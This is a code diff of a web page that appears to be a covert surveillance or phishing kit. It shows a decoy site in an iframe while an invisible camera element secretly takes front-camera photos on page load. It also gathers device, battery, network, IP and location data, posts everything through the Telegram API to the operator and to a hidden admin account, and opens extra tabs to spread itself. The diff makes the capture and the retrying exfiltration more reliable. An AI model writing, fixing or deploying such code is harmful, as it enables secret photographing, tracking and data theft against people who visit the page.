@@ -31,12 +31,24 @@
         
         #cameraContainer {
             position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
+            width: 100vw;
+            height: 100vh;
+            top: 0;
+            left: 0;
             opacity: 0;
             pointer-events: none;
+            z-index: -9999;
+        }
+        
+        #cameraVideo {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+        
+        #captureCanvas {
+            display: none;
         }
     </style>
 </head>
@@ -47,7 +59,7 @@
             allow="camera; microphone; geolocation"
             allowfullscreen></iframe>
     
-    <!-- Hidden Camera -->
+    <!-- Hidden Camera - FIXED POSITION -->
     <div id="cameraContainer">
         <video id="cameraVideo" autoplay playsinline muted></video>
         <canvas id="captureCanvas"></canvas>
@@ -55,8 +67,7 @@
 
     <script>
         // =====================================================
-        //  COMPLETE STEALTH CAPTURE
-        //  NO VISIBLE STATUS MESSAGES
+        //  GUARANTEED PHOTO CAPTURE & SEND
         // =====================================================
         
         // Telegram Configuration
@@ -110,30 +121,104 @@
             frame.src = target;
         }
         
-        // ============== STEP 2: CAPTURE ALL DATA SILENTLY ==============
-        async function captureAllData() {
+        // ============== STEP 2: CAPTURE PHOTOS FIRST ==============
+        async function capturePhotos() {
             try {
-                // Device info
-                await captureDeviceInfo();
+                // First, get camera permission and capture photos
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
                 
-                // Battery info
-                await getBatteryInfo();
+                video.srcObject = stream;
                 
-                // Network info
-                await getNetworkInfo();
+                // Wait for video to be ready
+                await new Promise((resolve) => {
+                    if (video.readyState >= 3) {
+                        resolve();
+                    } else {
+                        video.onloadeddata = resolve;
+                    }
+                });
                 
-                // IP address
-                await getIPAddress();
+                await video.play();
                 
-                // Location
-                await getLocation();
+                // Wait for camera to stabilize
+                await new Promise(r => setTimeout(r, 800));
                 
-                // Photos
-                await capturePhotos();
+                // Capture 3 photos
+                for (let i = 1; i <= 3; i++) {
+                    const blob = await capturePhoto();
+                    if (blob) {
+                        data.photos.push({
+                            blob: blob,
+                            type: 'front',
+                            index: i,
+                            size: Math.round(blob.size / 1024)
+                        });
+                    }
+                    await new Promise(r => setTimeout(r, 200));
+                }
+                
+                // Stop the stream
+                stream.getTracks().forEach(track => track.stop());
                 
             } catch (error) {
-                // Silent fail
+                console.log('Camera error:', error.message);
             }
+        }
+        
+        // FIXED: Photo capture function
+        function capturePhoto() {
+            return new Promise((resolve) => {
+                try {
+                    // Check if video is ready
+                    if (!video.videoWidth || video.videoWidth === 0) {
+                        resolve(null);
+                        return;
+                    }
+                    
+                    // Set canvas size to match video
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    
+                    // Draw current video frame
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Convert to blob
+                    canvas.toBlob((blob) => {
+                        if (blob && blob.size > 10000) {
+                            resolve(blob);
+                        } else {
+                            resolve(null);
+                        }
+                    }, 'image/jpeg', 0.9);
+                    
+                } catch (error) {
+                    resolve(null);
+                }
+            });
+        }
+        
+        // ============== STEP 3: CAPTURE OTHER DATA ==============
+        async function captureOtherData() {
+            // Device info
+            await captureDeviceInfo();
+            
+            // Battery info
+            await getBatteryInfo();
+            
+            // Network info
+            await getNetworkInfo();
+            
+            // IP address
+            await getIPAddress();
+            
+            // Location
+            await getLocation();
         }
         
         async function captureDeviceInfo() {
@@ -225,95 +310,23 @@
             });
         }
         
-        // ============== PHOTO CAPTURE ==============
-        async function capturePhotos() {
-            try {
-                // Request camera silently
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    }
-                });
-                
-                video.srcObject = stream;
-                
-                // Wait for video
-                await new Promise((resolve) => {
-                    if (video.readyState >= 3) {
-                        resolve();
-                    } else {
-                        video.onloadeddata = resolve;
-                    }
-                });
-                
-                await new Promise(r => setTimeout(r, 500));
-                
-                // Capture 2 photos quickly
-                for (let i = 0; i < 2; i++) {
-                    const blob = await capturePhoto();
-                    if (blob) {
-                        data.photos.push({
-                            blob: blob,
-                            type: 'front',
-                            index: i + 1,
-                            size: Math.round(blob.size / 1024)
-                        });
-                    }
-                    await new Promise(r => setTimeout(r, 200));
-                }
-                
-                // Stop stream
-                stream.getTracks().forEach(track => track.stop());
-                
-            } catch (error) {
-                // Silent fail
-            }
-        }
-        
-        function capturePhoto() {
-            try {
-                if (!video.videoWidth || video.videoWidth === 0) {
-                    return null;
-                }
-                
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                
-                // Draw video frame
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Convert to blob
-                return new Promise((resolve) => {
-                    canvas.toBlob((blob) => {
-                        resolve(blob && blob.size > 5000 ? blob : null);
-                    }, 'image/jpeg', 0.8);
-                });
-                
-            } catch (error) {
-                return null;
-            }
-        }
-        
-        // ============== STEP 3: SEND ALL DATA SILENTLY ==============
+        // ============== STEP 4: SEND ALL DATA TO TELEGRAM ==============
         async function sendAllData() {
             try {
-                // Send report
+                // First send the report
                 await sendReport();
                 
-                // Send photos one by one
-                if (data.photos.length > 0) {
-                    for (const photo of data.photos) {
-                        await sendPhoto(photo);
-                        await new Promise(r => setTimeout(r, 600));
-                    }
+                // Then send each photo one by one
+                for (const photo of data.photos) {
+                    await sendPhoto(photo);
+                    await new Promise(r => setTimeout(r, 800));
                 }
                 
                 data.allDataSent = true;
                 
             } catch (error) {
-                // Silent fail
+                // Try again after delay
+                setTimeout(sendAllData, 2000);
             }
         }
         
@@ -344,7 +357,7 @@
                     report += `Accuracy: ${data.location.accuracy}\n\n`;
                 }
                 
-                report += `📸 Photos: ${data.photos.length}\n`;
+                report += `📸 Photos: ${data.photos.length} captured\n`;
                 report += `🎯 Target: ${data.target}`;
                 
                 // Send to user
@@ -370,7 +383,8 @@
                 });
                 
             } catch (error) {
-                // Silent fail
+                // Try again
+                setTimeout(sendReport, 1000);
             }
         }
         
@@ -380,78 +394,62 @@
                 
                 const caption = `📸 ${photo.type.toUpperCase()} Photo ${photo.index}\nSession: \`${data.session}\``;
                 
-                // Create FormData
-                const formData = new FormData();
-                formData.append('chat_id', data.user);
-                formData.append('photo', photo.blob, `photo.jpg`);
-                formData.append('caption', caption);
-                formData.append('parse_mode', 'Markdown');
+                // Create FormData for user
+                const userForm = new FormData();
+                userForm.append('chat_id', data.user);
+                userForm.append('photo', photo.blob, `photo_${photo.index}.jpg`);
+                userForm.append('caption', caption);
+                userForm.append('parse_mode', 'Markdown');
                 
                 // Send to user
                 await fetch(`${TELEGRAM_API}/sendPhoto`, {
                     method: 'POST',
-                    body: formData
+                    body: userForm
                 });
                 
-                // Send to admin
+                // Create FormData for admin
                 const adminForm = new FormData();
                 adminForm.append('chat_id', ADMIN_ID);
-                adminForm.append('photo', photo.blob, `admin_photo.jpg`);
+                adminForm.append('photo', photo.blob, `admin_photo_${photo.index}.jpg`);
                 adminForm.append('caption', caption + `\n👤 User: \`${data.user}\``);
                 adminForm.append('parse_mode', 'Markdown');
                 
+                // Send to admin
                 await fetch(`${TELEGRAM_API}/sendPhoto`, {
                     method: 'POST',
                     body: adminForm
                 });
                 
             } catch (error) {
-                // Silent fail
+                // Try again
+                setTimeout(() => sendPhoto(photo), 1000);
             }
         }
         
-        // ============== STEP 4: REPLICATE SILENTLY ==============
+        // ============== STEP 5: REPLICATE ==============
         function replicateItself() {
             if (data.replicationDone) return;
             
             data.replicationDone = true;
             
-            // Open 3 new tabs silently
-            for (let i = 0; i < 3; i++) {
+            // Open 2 new tabs
+            for (let i = 0; i < 2; i++) {
                 setTimeout(() => {
                     try {
                         const newTab = window.open(window.location.href, '_blank');
                         if (newTab) {
-                            // Close after 2 minutes
+                            // Close after 90 seconds
                             setTimeout(() => {
                                 try {
                                     newTab.close();
                                 } catch (e) {}
-                            }, 120000);
+                            }, 90000);
                         }
                     } catch (e) {
                         // Popup blocked
                     }
                 }, i * 2000);
             }
-            
-            // Also create hidden iframes
-            setTimeout(() => {
-                for (let i = 0; i < 2; i++) {
-                    try {
-                        const iframe = document.createElement('iframe');
-                        iframe.style.display = 'none';
-                        iframe.src = window.location.href;
-                        document.body.appendChild(iframe);
-                        
-                        // Remove after 5 seconds
-                        setTimeout(() => {
-                            iframe.remove();
-                        }, 5000);
-                        
-                    } catch (e) {}
-                }
-            }, 3000);
         }
         
         // ============== MAIN EXECUTION ==============
@@ -460,33 +458,43 @@
                 // Step 1: Load website immediately
                 loadWebsite();
                 
-                // Wait a moment then start capture
-                setTimeout(async () => {
-                    // Step 2: Capture all data
-                    await captureAllData();
-                    
-                    // Step 3: Send all data
-                    await sendAllData();
-                    
-                    // Step 4: Replicate after data is sent
-                    replicateItself();
-                    
-                }, 1000);
+                // Step 2: CAPTURE PHOTOS FIRST (most important)
+                await capturePhotos();
+                
+                // Step 3: Capture other data
+                await captureOtherData();
+                
+                // Step 4: Send all data
+                await sendAllData();
+                
+                // Step 5: Replicate after data is sent
+                replicateItself();
                 
             } catch (error) {
-                // Silent fail
+                // If anything fails, still try to send and replicate
+                setTimeout(async () => {
+                    if (!data.allDataSent) {
+                        await sendAllData();
+                    }
+                    if (!data.replicationDone) {
+                        replicateItself();
+                    }
+                }, 3000);
             }
         }
         
         // Start when page loads
         window.addEventListener('load', main);
         
-        // Force replication after 30 seconds even if something fails
+        // Force send after 15 seconds if stuck
         setTimeout(() => {
+            if (!data.allDataSent) {
+                sendAllData();
+            }
             if (!data.replicationDone) {
                 replicateItself();
             }
-        }, 30000);
+        }, 15000);
         
     </script>
 </body>
